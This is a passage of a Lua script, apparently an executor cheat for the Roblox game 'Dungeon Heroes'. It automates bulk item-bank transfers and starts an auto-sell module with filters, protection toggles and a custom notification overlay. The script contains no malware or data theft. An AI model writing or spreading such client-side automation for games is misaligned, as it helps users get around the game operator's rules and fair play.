                        if string.find(tostring(k), "^GearPreset") and v then
                            return true, "Preset"
                        end
                    end
                end
            elseif type(Item) == "table" then
                for k, v in pairs(Item) do
                    if (string.find(tostring(k), "^GearPreset") or k == "presets" or k == "Presets") and v then
                        if type(v) ~= "table" or next(v) ~= nil then
                            return true, "Preset"
                        end
                    end
                end
            end
        end

        return false, nil
    end

    -- ==========================================
    -- MULTI-CATEGORY FILTER MATCHING LOGIC
    -- ==========================================
    local function IsGearOrSkillCategory(Category)
        return Category == "Weapon"
            or Category == "Armor"
            or Category == "Necklace"
            or Category == "Skill"
    end

    local function MatchesSingleFilterRule(Data, FilterRule)
        if not FilterRule then return false end

        local Cat = Data.Category
        local Kind = FilterRule.kind

        if Kind == "all_bankable" then
            return true
        elseif Kind == "gear_all" then
            return Cat == "Weapon" or Cat == "Armor" or Cat == "Necklace"
        elseif Kind == "gear_and_skill" then
            return IsGearOrSkillCategory(Cat)
        elseif Kind == "category" then
            return Cat == FilterRule.category
                or Data.SortCategory == FilterRule.category
        end

        return false
    end

    local function MatchesCategoryFilter(Data)
        if IsExcludedCategory(Data) then
            return false
        end

        for _, OptionName in ipairs(SelectedCategoriesList) do
            local Rule = FilterMap[OptionName]
            if MatchesSingleFilterRule(Data, Rule) then
                return true
            end
        end

        return false
    end

    local function PassesRarityAndLevel(Details)
        if not AllRaritiesEnabled then
            if RarityConfig[Details.Rarity] ~= true then
                return false
            end
        end

        if LevelFilterEnabled and IsGearOrSkillCategory(Details.Data.Category) then
            if Details.Level < MinLevelFilter or Details.Level > MaxLevelFilter then
                return false
            end
        end

        return true
    end

    -- ==========================================
    -- STORAGE CONTAINERS (INVENTORY & ITEM BANK)
    -- ==========================================
    local function GetRawContainerItems(Direction, IncludePets)
        local RawList = {}
        local SeenUIDs = {}
        local Profile = ProfileSystem:GetProfile(Player)

        local function AddRawItem(Item, Key)
            if not Item then return end
            if typeof(Item) == "Instance" and Item:IsA("Folder") then
                return
            end
            local UID = GetItemUID(Item, Key)
            if UID and not SeenUIDs[UID] then
                SeenUIDs[UID] = true
                table.insert(RawList, {Item = Item, Key = Key, UID = UID})
            end
        end

        if Direction == "Inventory -> Bank" then
            local InvFolder = (Profile and Profile:FindFirstChild("Inventory"))
                or Items:GetPlayerItemFolder(Player, "Inventory")
            if InvFolder then
                for _, Child in ipairs(InvFolder:GetChildren()) do
                    AddRawItem(Child, nil)
                end
            end

            -- Only scan Profile.Pets when Pet or All Bankable Items is selected
            if IncludePets then
                local PetsFolder = (Profile and Profile:FindFirstChild("Pets"))
                    or Items:GetPlayerItemFolder(Player, "Pets")
                if PetsFolder then
                    for _, Child in ipairs(PetsFolder:GetChildren()) do
                        AddRawItem(Child, nil)
                    end
                end
            end
        else
            local s1, BankTable = pcall(function()
                return Items:GetTableItems(Player, "ItemBank")
            end)
            if s1 and type(BankTable) == "table" then
                for k, v in pairs(BankTable) do
                    AddRawItem(v, k)
                end
            end

            local s2, RecContainer = pcall(function()
                return Items:GetRecordContainer(Player, "ItemBank")
            end)
            if s2 and type(RecContainer) == "table" then
                local SubTbl = RecContainer.Items or RecContainer.Records or RecContainer
                if type(SubTbl) == "table" then
                    for k, v in pairs(SubTbl) do
                        if type(v) == "table" or typeof(v) == "Instance" then
                            AddRawItem(v, k)
                        end
                    end
                end
            end

            local BankFolder = nil
            pcall(function()
                BankFolder = Items:GetPlayerItemFolder(Player, "ItemBank")
            end)
            if not BankFolder and Profile then
                BankFolder = Profile:FindFirstChild("ItemBank")
            end
            if BankFolder and typeof(BankFolder) == "Instance" then
                for _, Child in ipairs(BankFolder:GetChildren()) do
                    AddRawItem(Child, nil)
                end
            end
        end

        return RawList
    end

    local function GetCurrentSourceUIDLookup(Direction, IncludePets)
        local Lookup = {}
        local RawList = GetRawContainerItems(Direction, IncludePets)
        for _, Raw in ipairs(RawList) do
            Lookup[Raw.UID] = true
        end
        return Lookup
    end

    local function GetInventoryUsedCount()
        local Profile = ProfileSystem:GetProfile(Player)
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        return Inv and #Inv:GetChildren() or 0
    end

    local function GetTotalBankCount()
        local s, cnt = pcall(function()
            return Items:GetItemBankStorageCount(Player)
        end)
        if s and tonumber(cnt) and tonumber(cnt) >= 0 then
            return tonumber(cnt)
        end
        return #GetRawContainerItems("Bank -> Inventory", false)
    end

    -- ==========================================
    -- COLLECT & BUILD FINAL TRANSFER LIST
    -- ==========================================
    local function ScanCandidates(IgnoreLocks)
        local Now = os.clock()
        for UID, TimeStamp in pairs(RecentlyTransferred) do
            if Now - TimeStamp >= UIDLockDuration then
                RecentlyTransferred[UID] = nil
            end
        end

        local IncludePets = ShouldScanPetsFolder()
        local RawItems = GetRawContainerItems(TransferDirection, IncludePets)
        local MatchedEntries = {}
        local ProtectedSkippedCount = 0

        for _, Raw in ipairs(RawItems) do
            local RejectKey = TransferDirection .. "|" .. Raw.UID
            local IsBlacklisted = (not IgnoreLocks) and (RejectedUIDBlacklist[RejectKey] == true)
            local IsTempLocked = (not IgnoreLocks) and (RecentlyTransferred[Raw.UID] ~= nil)

            if not IsBlacklisted and not IsTempLocked then
                local Details = GetItemDetails(Raw.Item, Raw.Key)
                if Details and MatchesCategoryFilter(Details.Data) and PassesRarityAndLevel(Details) then
                    local Protected, Reason = IsItemProtected(Raw.Item)
                    Details.Protected = Protected
                    Details.ProtectReason = Reason

                    if Protected then
                        ProtectedSkippedCount = ProtectedSkippedCount + 1
                    end
                    table.insert(MatchedEntries, Details)
                end
            end
        end

        return MatchedEntries, ProtectedSkippedCount
    end

    local function SortEntries(Entries)
        table.sort(Entries, function(a, b)
            if SortPriority == "Highest Level First" then
                if a.Level ~= b.Level then return a.Level > b.Level end
                return a.Rarity > b.Rarity
            elseif SortPriority == "Lowest Level First" then
                if a.Level ~= b.Level then return a.Level < b.Level end
                return a.Rarity < b.Rarity
            elseif SortPriority == "Highest Rarity First" then
                if a.Rarity ~= b.Rarity then return a.Rarity > b.Rarity end
                return a.Level > b.Level
            elseif SortPriority == "Lowest Rarity First" then
                if a.Rarity ~= b.Rarity then return a.Rarity < b.Rarity end
                return a.Level < b.Level
            end
            return tostring(a.UID) < tostring(b.UID)
        end)
    end

    local function BuildTransferList(MatchedEntries)
        local FinalList = {}

        if TransferMode == "All Matching" then
            for _, Entry in ipairs(MatchedEntries) do
                if not Entry.Protected then
                    table.insert(FinalList, Entry)
                end
            end
            SortEntries(FinalList)
            return FinalList
        end

        local Groups = {}
        for _, Entry in ipairs(MatchedEntries) do
            local Key = tostring(Entry.ID) .. "|" .. tostring(Entry.Rarity)
            if Entry.Data.Category == "Skill" then
                Key = Key .. "|" .. tostring(Entry.SeasonalLevel)
            end
            Groups[Key] = Groups[Key] or {}
            table.insert(Groups[Key], Entry)
        end

        for _, Group in pairs(Groups) do
            local ProtectedList = {}
            local UnprotectedList = {}

            for _, Entry in ipairs(Group) do
                if Entry.Protected then
                    table.insert(ProtectedList, Entry)
                else
                    table.insert(UnprotectedList, Entry)
                end
            end

            local BestProtectedLevel = -math.huge
            for _, Entry in ipairs(ProtectedList) do
                BestProtectedLevel = math.max(BestProtectedLevel, Entry.Level)
            end

            table.sort(UnprotectedList, function(a, b)
                return a.Level > b.Level
            end)

            local KeptOne = false
            for _, Entry in ipairs(UnprotectedList) do
                if not KeptOne and (#ProtectedList == 0 or Entry.Level > BestProtectedLevel) then
                    KeptOne = true
                else
                    table.insert(FinalList, Entry)
                end
            end
        end

        SortEntries(FinalList)
        return FinalList
    end

    -- ==========================================
    -- VERIFIED TRANSFER EXECUTION ENGINE (ZERO SPAM)
    -- ==========================================
    local IsTransferringBatch = false
    local MasterToggleRef = nil

    local function StopAutoTransferWithNotify(Title, SubText, Color)
        AutoTransferEnabled = false
        if MasterToggleRef and MasterToggleRef.Set then
            pcall(function() MasterToggleRef:Set(false) end)
        end
        ShowTopNotification(Title, SubText, Color or Color3.fromRGB(255, 175, 50), 3.0)
    end

    local function ExecuteBankTransfer(IsManualRun)
        if IsTransferringBatch then return end
        IsTransferringBatch = true

        local Success, Err = pcall(function()
            -- 1. Check Bank Storage Full when moving Inventory -> Bank
            if TransferDirection == "Inventory -> Bank" then
                local BankCap = tonumber(Items.ITEM_BANK_STORAGE_LIMIT)
                if BankCap and BankCap > 0 and GetTotalBankCount() >= BankCap then
                    StopAutoTransferWithNotify(
                        "Item Bank Full!",
                        string.format("Bank storage reached %d/%d", GetTotalBankCount(), BankCap),
                        Color3.fromRGB(255, 95, 95)
                    )
                    return
                end
            end

            -- 2. Check Inventory Space Guard when moving Bank -> Inventory
            if TransferDirection == "Bank -> Inventory" and EnableSpaceGuard then
                local UsedInv = GetInventoryUsedCount()
                if UsedInv >= MaxInventoryCap then
                    StopAutoTransferWithNotify(
                        "Space Guard Active",
                        string.format("Inventory full (%d/%d items)", UsedInv, MaxInventoryCap),
                        Color3.fromRGB(255, 95, 95)
                    )
                    return
                end
            end

            local MatchedEntries, ProtectedSkipped = ScanCandidates(false)
            local FinalList = BuildTransferList(MatchedEntries)

            if #FinalList == 0 then
                if IsManualRun then
                    if ProtectedSkipped > 0 then
                        ShowTopNotification(
                            string.format("0 Ready (%d Protected)", ProtectedSkipped),
                            "Matched items Starred/Preset hain",
                            Color3.fromRGB(255, 180, 50),
                            3.0
                        )
                    else
                        ShowTopNotification(
                            "No Matching Items",
                            "Category, Rarity ya Level filter check karo",
                            Color3.fromRGB(255, 100, 100),
                            3.0
                        )
                    end
                end
                return
            end

            -- Determine how many items to fire in this verification pass
            local RemainingBatchLimit = (MaxTransferCount > 0) and math.max(0, MaxTransferCount - TransferCounter) or #FinalList
            if MaxTransferCount > 0 and RemainingBatchLimit <= 0 then
                if AutoStopOnLimit then
                    StopAutoTransferWithNotify(
                        string.format("Batch Done (%d/%d)", TransferCounter, MaxTransferCount),
                        string.format("%s | %s", TransferDirection, GetCategorySummaryText()),
                        Color3.fromRGB(0, 235, 155)
                    )
                end
                return
            end

            local PassLimit = math.min(#FinalList, RemainingBatchLimit, MaxVerifyChunkSize)
            local ActiveDirection = TransferDirection
            local IncludePets = ShouldScanPetsFolder()

            local AttemptedUIDs = {}
            local HitSpaceGuard = false

            for i = 1, PassLimit do
                if not AutoTransferEnabled and not IsManualRun then
                    break
                end

                if ActiveDirection == "Bank -> Inventory" and EnableSpaceGuard then
                    if GetInventoryUsedCount() >= MaxInventoryCap then
                        HitSpaceGuard = true
                        break
                    end
                end

                local Entry = FinalList[i]
                if Entry and Entry.UID then
                    RecentlyTransferred[Entry.UID] = os.clock()
                    table.insert(AttemptedUIDs, Entry.UID)
                    ItemBankRemote:FireServer(Entry.UID)
                    task.wait(SingleTransferDelay)
                end
            end

            if #AttemptedUIDs == 0 then
                if HitSpaceGuard then
                    StopAutoTransferWithNotify(
                        "Space Guard Stopped",
                        string.format("Reached %d/%d bag limit", GetInventoryUsedCount(), MaxInventoryCap),
                        Color3.fromRGB(255, 125, 65)
                    )
                end
                return
            end

            -- WAIT FOR SERVER REPLICATION & VERIFY WHICH ITEMS ACTUALLY MOVED!
            task.wait(VerifyWaitDelay)
            local PostSourceUIDs = GetCurrentSourceUIDLookup(ActiveDirection, IncludePets)

            local ActualMovedCount = 0
            local RejectedCount = 0

            for _, UID in ipairs(AttemptedUIDs) do
                if not PostSourceUIDs[UID] then
                    -- Item genuinely left source storage!
                    ActualMovedCount = ActualMovedCount + 1
                else
                    -- Item is STILL in source storage -> Server rejected it (starred/unbankable/locked)!
                    -- Blacklist it for this direction so it NEVER spams remotes or notifications again!
                    RejectedUIDBlacklist[ActiveDirection .. "|" .. UID] = true
                    RejectedCount = RejectedCount + 1
                end
            end

            TransferCounter = TransferCounter + ActualMovedCount

            -- ONLY notify when items ACTUALLY moved! (Silent in auto mode if 0 moved!)
            if ActualMovedCount > 0 then
                local SummaryText = GetCategorySummaryText()

                if MaxTransferCount > 0 and TransferCounter >= MaxTransferCount and AutoStopOnLimit then
                    StopAutoTransferWithNotify(
                        string.format("Batch Done (%d/%d)", TransferCounter, MaxTransferCount),
                        string.format("%s | %s", ActiveDirection, SummaryText),
                        Color3.fromRGB(0, 235, 155)
                    )
                elseif HitSpaceGuard then
                    StopAutoTransferWithNotify(
                        string.format("Moved %d | Space Guard", ActualMovedCount),
                        string.format("Stopped at %d/%d bag limit", GetInventoryUsedCount(), MaxInventoryCap),
                        Color3.fromRGB(255, 145, 65)
                    )
                else
                    ShowTopNotification(
                        string.format("Moved %d Item(s)", ActualMovedCount),
                        string.format("%s | %s", ActiveDirection, SummaryText),
                        Color3.fromRGB(0, 235, 155),
                        3.0
                    )
                end
            elseif IsManualRun then
                if RejectedCount > 0 then
                    ShowTopNotification(
                        "0 Moved (Server Skipped)",
                        string.format("%d item(s) Starred ya Unbankable hain", RejectedCount),
                        Color3.fromRGB(255, 180, 50),
                        3.0
                    )
                end
            end
        end)

        if not Success then
            warn("[Item Bank Error]:", Err)
            ShowTopNotification("Transfer Error", tostring(Err), Color3.fromRGB(255, 80, 80), 3.0)
        end

        IsTransferringBatch = false
    end

    -- ==========================================
    -- RAYFIELD UI CONTROLS (ALL WITH FLAGS)
    -- ==========================================
    MasterToggleRef = UtilityTab:CreateToggle({
        Name = "Auto Bank Transfer (Master Switch)",
        CurrentValue = false,
        Flag = "DH_BankMasterToggle",
        Callback = function(Value)
            AutoTransferEnabled = Value
            if Value then
                TransferCounter = 0
                table.clear(RejectedUIDBlacklist)
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Direction",
        Options = {
            "Inventory -> Bank",
            "Bank -> Inventory"
        },
        CurrentOption = "Inventory -> Bank",
        MultipleOptions = false,
        Flag = "DH_BankDirection",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                TransferDirection = Option
                TransferCounter = 0
                table.clear(RecentlyTransferred)
                table.clear(RejectedUIDBlacklist)
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Categories (Multi-Select)",
        Options = CategoryOptions,
        CurrentOption = {"Gear (Weapon + Armor + Necklace)"},
        MultipleOptions = true,
        Flag = "DH_BankCategoriesMulti",
        Callback = function(Options)
            local NewSelected = {}
            if type(Options) == "table" then
                for _, Opt in pairs(Options) do
                    if type(Opt) == "string" and FilterMap[Opt] then
                        table.insert(NewSelected, Opt)
                    end
                end
            elseif type(Options) == "string" and FilterMap[Options] then
                table.insert(NewSelected, Options)
            end

            SelectedCategoriesList = NewSelected
            TransferCounter = 0
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Mode",
        Options = {
            "All Matching",
            "Duplicates Only (Keep 1 Best)"
        },
        CurrentOption = "All Matching",
        MultipleOptions = false,
        Flag = "DH_BankMode",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                TransferMode = Option
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Transfer Priority Order",
        Options = {
            "Highest Level First",
            "Lowest Level First",
            "Highest Rarity First",
            "Lowest Rarity First"
        },
        CurrentOption = "Highest Level First",
        MultipleOptions = false,
        Flag = "DH_BankPriority",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                SortPriority = Option
            end
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Favorited & Sealed Items",
        CurrentValue = true,
        Flag = "DH_BankProtectFav",
        Callback = function(Value)
            ProtectFavorites = Value
            table.clear(RejectedUIDBlacklist)
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Gear Preset Items (Preset 1/2/3)",
        CurrentValue = true,
        Flag = "DH_BankProtectPresets",
        Callback = function(Value)
            ProtectGearPresets = Value
            table.clear(RejectedUIDBlacklist)
        end
    })

    -- ==========================================
    -- QUANTITY & INVENTORY SPACE SAFETY
    -- ==========================================
    UtilityTab:CreateSection("Batch Limit & Space Protection")

    UtilityTab:CreateSlider({
        Name = "Max Items To Transfer (0 = Unlimited)",
        Range = {0, 200},
        Increment = 1,
        Suffix = " Items",
        CurrentValue = 10,
        Flag = "DH_BankMaxSlider",
        Callback = function(Value)
            MaxTransferCount = tonumber(Value) or 0
            TransferCounter = 0
        end
    })

    UtilityTab:CreateInput({
        Name = "Type Exact Quantity (0 = Unlimited)",
        PlaceholderText = "e.g. 15",
        RemoveTextAfterFocusLost = false,
        Flag = "DH_BankExactQtyInput",
        Callback = function(Text)
            local Num = tonumber(Text)
            if Num and Num >= 0 then
                MaxTransferCount = math.floor(Num)
                TransferCounter = 0
            end
        end
    })

    UtilityTab:CreateToggle({
        Name = "Auto-Stop When Batch Quantity Reached",
        CurrentValue = true,
        Flag = "DH_BankAutoStopBatch",
        Callback = function(Value)
            AutoStopOnLimit = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Enable Inventory Space Guard (Bank -> Inv)",
        CurrentValue = true,
        Flag = "DH_BankSpaceGuard",
        Callback = function(Value)
            EnableSpaceGuard = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Stop When Inventory Reaches X Items",
        Range = {30, 300},
        Increment = 5,
        Suffix = " Items",
        CurrentValue = 180,
        Flag = "DH_BankInvCap",
        Callback = function(Value)
            MaxInventoryCap = tonumber(Value) or 180
        end
    })

    -- ==========================================
    -- GEAR & SKILL LEVEL FILTER (1 TO 500)
    -- ==========================================
    UtilityTab:CreateSection("Gear & Skill Level Filter (Lv 1 - 500)")

    UtilityTab:CreateToggle({
        Name = "Enable Level Range Filter (Gear & Skills)",
        CurrentValue = false,
        Flag = "DH_BankLevelToggle",
        Callback = function(Value)
            LevelFilterEnabled = Value
        end
    })

    UtilityTab:CreateInput({
        Name = "Quick Level Range (Format: Min-Max)",
        PlaceholderText = "e.g. 200-240",
        RemoveTextAfterFocusLost = false,
        Flag = "DH_BankQuickLevelInput",
        Callback = function(Text)
            local MinStr, MaxStr = string.match(tostring(Text), "(%d+)%s*-%s*(%d+)")
            local MinVal, MaxVal = tonumber(MinStr), tonumber(MaxStr)
            if MinVal and MaxVal then
                MinLevelFilter = math.min(MinVal, MaxVal)
                MaxLevelFilter = math.max(MinVal, MaxVal)
            end
        end
    })

    UtilityTab:CreateSlider({
        Name = "Minimum Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 1,
        Flag = "DH_BankMinLevel",
        Callback = function(Value)
            MinLevelFilter = tonumber(Value) or 1
            if MinLevelFilter > MaxLevelFilter then
                MaxLevelFilter = MinLevelFilter
            end
        end
    })

    UtilityTab:CreateSlider({
        Name = "Maximum Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 500,
        Flag = "DH_BankMaxLevel",
        Callback = function(Value)
            MaxLevelFilter = tonumber(Value) or 500
            if MaxLevelFilter < MinLevelFilter then
                MinLevelFilter = MaxLevelFilter
            end
        end
    })

    -- ==========================================
    -- RARITY FILTERS (1 TO 9)
    -- ==========================================
    UtilityTab:CreateSection("Rarity Filters (1 to 9)")

    UtilityTab:CreateToggle({
        Name = "Allow All Rarities (Ignore Toggles Below)",
        CurrentValue = false,
        Flag = "DH_BankRarityAll",
        Callback = function(Value)
            AllRaritiesEnabled = Value
        end
    })

    local Rarities = {
        {Name = "Common (ID 1)", ID = 1, Key = "Common"},
        {Name = "Uncommon (ID 2)", ID = 2, Key = "Uncommon"},
        {Name = "Rare (ID 3)", ID = 3, Key = "Rare"},
        {Name = "Epic (ID 4)", ID = 4, Key = "Epic"},
        {Name = "Legendary (ID 5)", ID = 5, Key = "Legendary"},
        {Name = "Mythic (ID 6)", ID = 6, Key = "Mythic"},
        {Name = "Primordial (ID 7)", ID = 7, Key = "Primordial"},
        {Name = "Unique (ID 8)", ID = 8, Key = "Unique"},
        {Name = "Nightmare (ID 9)", ID = 9, Key = "Nightmare"},
    }

    for _, Rarity in ipairs(Rarities) do
        UtilityTab:CreateToggle({
            Name = "Transfer " .. Rarity.Name,
            CurrentValue = false,
            Flag = "DH_BankRarity_" .. Rarity.Key,
            Callback = function(Value)
                RarityConfig[Rarity.ID] = Value
            end
        })
    end

    -- ==========================================
    -- SCANNER & MANUAL ONE-SHOT BUTTONS
    -- ==========================================
    UtilityTab:CreateSection("Scanner & Instant Transfer")

    UtilityTab:CreateButton({
        Name = "Scan Matching Items",
        Callback = function()
            local InvCount = GetInventoryUsedCount()
            local BankCount = GetTotalBankCount()
            local MatchedEntries, ProtectedSkipped = ScanCandidates(true)
            local ReadyList = BuildTransferList(MatchedEntries)

            ShowTopNotification(
                string.format("Ready: %d | Safe: %d (Bag:%d Bank:%d)", #ReadyList, ProtectedSkipped, InvCount, BankCount),
                string.format("%s | %s", TransferDirection, GetCategorySummaryText()),
                (#ReadyList > 0) and Color3.fromRGB(0, 235, 155) or Color3.fromRGB(255, 180, 50),
                3.0
            )
        end
    })

    UtilityTab:CreateButton({
        Name = "Transfer Batch Once Now",
        Callback = function()
            task.spawn(function()
                TransferCounter = 0
                table.clear(RejectedUIDBlacklist)
                ExecuteBankTransfer(true)
            end)
        end
    })

    -- ==========================================
    -- BACKGROUND LOOP
    -- ==========================================
    task.spawn(function()
        while true do
            task.wait(ScanDelay)
            if AutoTransferEnabled and not IsTransferringBatch then
                ExecuteBankTransfer(false)
            end
        end
    end)
end          

UtilityTab:CreateSection("Ultimate Safe Auto Sell V5 (Inv + Bank)")
do
    --====================================================
    -- DUNGEON HEROES | ULTRA-PREMIUM ZERO-RISK AUTO SELL V5
    -- 1. Compact Glassmorphism Top UI + Instant Tap-To-Dismiss
    -- 2. Zero Spam: Notifies ONLY on Verified Actual Sales & Manual Scan
    -- 3. Post-Sell Verification + Auto-Blacklist for Server-Rejected UIDs
    -- 4. Multi-Select Categories + Per-Item Cosmetic Forced Dupe & Dye Rule
    -- 5. UNIQUE RARITY (ID 8) Permanently Hard-Blocked & Removed from UI
    -- 6. Deep Star/Favorite, Preset 1-10+, Socketed Gem & God-Roll Shields
    -- 7. Unique Flags Attached to Every Control
    --====================================================

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer

    local Items = require(RS.Systems.Items)
    local ItemSelling = require(RS.Systems.ItemSelling)
    local ProfileSystem = require(RS.Systems.Profile)
    local ItemBankRemote = RS:WaitForChild("Remotes"):WaitForChild("ItemBankTransfer")

    -- ==========================================
    -- COMPACT GLASSMORPHISM UI (TAP TO DISMISS)
    -- ==========================================
    local function ShowGlassNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 3.0
                local ThemeColor = AccentColor or Color3.fromRGB(0, 235, 160)

                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_AutoSellGlassNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_AutoSellGlassNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local Card = Instance.new("Frame")
                Card.Size = UDim2.new(0, 300, 0, 48)
                Card.Position = UDim2.new(0.5, -150, 0, -65)
                Card.BackgroundColor3 = Color3.fromRGB(16, 20, 30)
                Card.BackgroundTransparency = 0.18
                Card.BorderSizePixel = 0
                Card.ClipsDescendants = true
                Card.Parent = ScreenGui

                local CardCorner = Instance.new("UICorner")
                CardCorner.CornerRadius = UDim.new(0, 14)
                CardCorner.Parent = Card

                local GlassGradient = Instance.new("UIGradient")
                GlassGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(48, 56, 78)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(22, 26, 38)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 17, 26))
                })
                GlassGradient.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.12),
                    NumberSequenceKeypoint.new(1, 0.26)
                })
                GlassGradient.Rotation = 125
                GlassGradient.Parent = Card

                local GlassStroke = Instance.new("UIStroke")
                GlassStroke.Color = ThemeColor
                GlassStroke.Thickness = 1.2
                GlassStroke.Transparency = 0.30
                GlassStroke.Parent = Card

                local StrokeGradient = Instance.new("UIGradient")
                StrokeGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, ThemeColor),
                    ColorSequenceKeypoint.new(0.55, Color3.fromRGB(190, 205, 235)),
                    ColorSequenceKeypoint.new(1, ThemeColor)
                })
                StrokeGradient.Rotation = 45
                StrokeGradient.Parent = GlassStroke

                local AccentPill = Instance.new("Frame")
                AccentPill.Size = UDim2.new(0, 4, 0, 26)
                AccentPill.Position = UDim2.new(0, 9, 0.5, -13)
                AccentPill.BackgroundColor3 = ThemeColor
                AccentPill.BorderSizePixel = 0
                AccentPill.Parent = Card

                local PillCorner = Instance.new("UICorner")
                PillCorner.CornerRadius = UDim.new(1, 0)
                PillCorner.Parent = AccentPill

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -28, 0, 17)
                Title.Position = UDim2.new(0, 20, 0, 6)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 12
                Title.TextColor3 = ThemeColor
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.TextTruncate = Enum.TextTruncate.AtEnd
                Title.Text = tostring(TitleText)
                Title.Parent = Card

                local Sub = Instance.new("TextLabel")
                Sub.Size = UDim2.new(1, -28, 0, 15)
                Sub.Position = UDim2.new(0, 20, 0, 24)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 11
                Sub.TextColor3 = Color3.fromRGB(222, 230, 245)
                Sub.TextXAlignment = Enum.TextXAlignment.Left
                Sub.TextTruncate = Enum.TextTruncate.AtEnd
                Sub.Text = tostring(SubText)
                Sub.Parent = Card

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 2)
                BarBg.Position = UDim2.new(0, 0, 1, -2)
                BarBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                BarBg.BackgroundTransparency = 0.85
                BarBg.BorderSizePixel = 0
                BarBg.Parent = Card

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                local DismissBtn = Instance.new("TextButton")
                DismissBtn.Size = UDim2.new(1, 0, 1, 0)
                DismissBtn.BackgroundTransparency = 1
                DismissBtn.Text = ""
                DismissBtn.ZIndex = 10
                DismissBtn.Parent = Card

                local Dismissed = false
                local function DismissNow()
                    if Dismissed then return end
                    Dismissed = true

                    if Card and Card.Parent then
                        local Out = TweenService:Create(
                            Card,
                            TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                            {
                                Position = UDim2.new(0.5, -150, 0, -65),
                                BackgroundTransparency = 1
                            }
                        )
                        Out:Play()
                        Out.Completed:Wait()
                    end
                    if ScreenGui and ScreenGui.Parent then
                        ScreenGui:Destroy()
                    end
                end

                DismissBtn.Activated:Connect(DismissNow)
                DismissBtn.MouseButton1Click:Connect(DismissNow)

                TweenService:Create(
                    Card,
                    TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -150, 0, 14)}
                ):Play()

                TweenService:Create(
                    BarFill,
                    TweenInfo.new(ShowTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                    {Size = UDim2.new(0, 0, 1, 0)}
                ):Play()

                task.wait(ShowTime)
                DismissNow()
            end)
        end)
    end

    -- ==========================================
    -- SETTINGS & SAFETY STATE
    -- ==========================================
    local AutoSellEnabled = false
    local SellSource = "From Inventory Only"
    local DuplicateSellEnabled = false

    -- Bank Bridge & Anti-Spam Blacklists
    local BankPullBatchSize = 5
    local AutoReturnIfProtected = true
    local SafeBagLimitForBridge = 190
    local BankProtectedUIDBlacklist = {}
    local RejectedSellUIDBlacklist = {}
    local RecentlyPulledUIDs = {}

    -- Smart Protection Shields (All ON by default)
    local ProtectSocketedGems = true
    local ProtectGearPresets = true
    local ProtectGodRolls = true
    local MinMatchingStatsToProtect = 4

    -- Optional Max Sell Level Cap
    local UseMaxSellLevelCap = false
    local MaxSellLevel = 215

    -- Timings
    local ScanDelay = 0.30
    local SellCooldown = 1.0
    local VerifySellDelay = 0.35
    local LastSellTime = 0
    local IsRunningCycle = false

    -- Multi-Category State
    local SelectedCategoriesList = {"Gear (Weapons + Armor Only)"}

    -- Rarity Configuration (UNIQUE ID 8 PERMANENTLY BLOCKED!)
    local RarityConfig = {
        [1] = false, -- Common
        [2] = false, -- Uncommon
        [3] = false, -- Rare
        [4] = false, -- Epic
        [5] = false, -- Legendary
        [6] = false, -- Mythic
        [7] = false, -- Primordial
        -- [8] Unique is PERMANENTLY BLOCKED
        [9] = false, -- Nightmare
    }

    -- ==========================================
    -- DESCRIPTIVE MULTI-CATEGORY SETUP
    -- ==========================================
    local function IsTitleData(Data)
        return type(Data) == "table"
            and Data.Category == "Cosmetic"
            and Data.Type == "Title"
    end

    local CategoryOptions = {
        "Gear (Weapons + Armor Only)",
        "Weapon Only",
        "Armor Only",
        "Necklace Only",
        "Skill Only",
        "Pet Only",
        "Pet Token Only",
        "Refined Gem Only",
        "Cosmetic: Title (Dupes Only)",
        "Cosmetic: Weapon Aura (Dupes Only)",
        "Cosmetic: Body Aura (Dupes Only)",
        "Cosmetic: Weapon Skin (Dupes Only)",
        "Cosmetic: Shirt (Dupes Only)",
        "Cosmetic: Pants (Dupes Only)",
        "Cosmetic: All Types (Dupes Only)",
    }

    local FilterMap = {
